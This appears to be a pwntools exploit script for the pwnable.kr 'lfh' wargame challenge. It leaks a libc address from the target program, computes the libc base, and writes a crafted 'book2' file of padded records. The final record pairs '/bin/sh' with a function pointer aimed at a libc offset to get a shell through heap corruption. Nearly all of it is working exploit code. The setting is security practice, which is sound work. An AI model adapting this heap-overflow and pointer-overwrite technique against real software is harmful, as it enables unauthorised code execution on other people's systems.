from pwn import * 

#exe = ELF('libc.so.6')
#print(exe.sym.__libc_start_main)

#ssh_connection = ssh(host="pwnable.kr", user="lfh", password="guest", port=2222)
#p = ssh_connection

p = process(["/home/angel/lfhsolve/lfh", "/home/angel/lfhsolve/book", "1"])
#p = gdb.debug("/home/angel/lfhsolve/lfh", "set args /home/angel/lfhsolve/book 1")
#p = gdb.debug("/home/angel/lfhsolve/lfh")

p.recvuntil("this option fortifies your heap from corruption. continue?(y/n)\n")
p.sendline("y")

data = p.recvuntil("47")
data_split = data.split(b'0x')
if(len(data_split) != 2):
    for i in range(5):
        print("FAILED")
    exit()

libc_leak = int(data_split[1][:-3], 16)
libc_base = libc_leak - 132944 - 240

print(libc_base)

f = open("book2", "wb")

def create_book(signature, title, abstract, fptr, content_len, is_unicode, content, next):
	if (len(signature) != 4 and signature != "BOOK"):
		print("The signature is wrong")

	return signature + create_book_no_signature(title, abstract, fptr, content_len, is_unicode, content, next)

def create_book_no_signature(title, abstract, fptr, content_len, is_unicode, content, next):
	if(2**is_unicode * content_len != len(content)):
		print("The length of the content is wrong")
	print(len(content))

	return create_book_no_signature_no_content(title, abstract,
											 fptr, content_len,
											 is_unicode, next) + content

def create_book_no_signature_no_content(title, abstract, fptr, content_len, is_unicode, next):
	if (len(title) != 32):
		print("The title is wrong")
	elif (len(abstract) != 256):
		print("The abstract is wrong")
	elif (len(fptr) != 8):
		print("The fptr is wrong")
	elif (content_len > 8192):
		print("The content is too big")

	is_unicode_str = (b'\x01\x00\x00\x00' if is_unicode else b'\x00\x00\x00\x00')
	content_len_str = p32(content_len)


	return title + abstract + fptr + content_len_str + is_unicode_str + p64(0) + next

book_signature = b'BOOK'

BOOK_SIZE = 0x140

book = create_book(book_signature, b'A'*32, b'B'*256, b'C'*8, BOOK_SIZE, True, b'p'*BOOK_SIZE*2, b'E'*8)

book = create_book(book_signature, b'A'*32, b'B'*256, b'C'*8, BOOK_SIZE, True, b'p'*BOOK_SIZE*2, b'E'*8)
f.write(book)

for i in range(44):
	book = create_book_no_signature(b'A'*32, b'B'*256, b'C'*8, BOOK_SIZE, False, b'p'*BOOK_SIZE, b'E'*8)
	f.write(book)
	
def create_book_win(addr, book_size):
	print(p64(addr))
	print(repr(p64(addr))[2:-1])
	return b'A'*16 + b'/bin/sh\x00' + b'\x00'*8 + b'\x00'*256 + b'\x00'*8 + p32(book_size) + b'\x01\x00\x00\x00' + p64(addr) + b'E'*8

win_book = create_book_win(libc_base + 0x453a0, 0x140)

book = create_book_no_signature(b'A'*32, b'B'*256, b'C'*8, BOOK_SIZE, True, b'p'*BOOK_SIZE+win_book, b'E'*8)
f.write(book)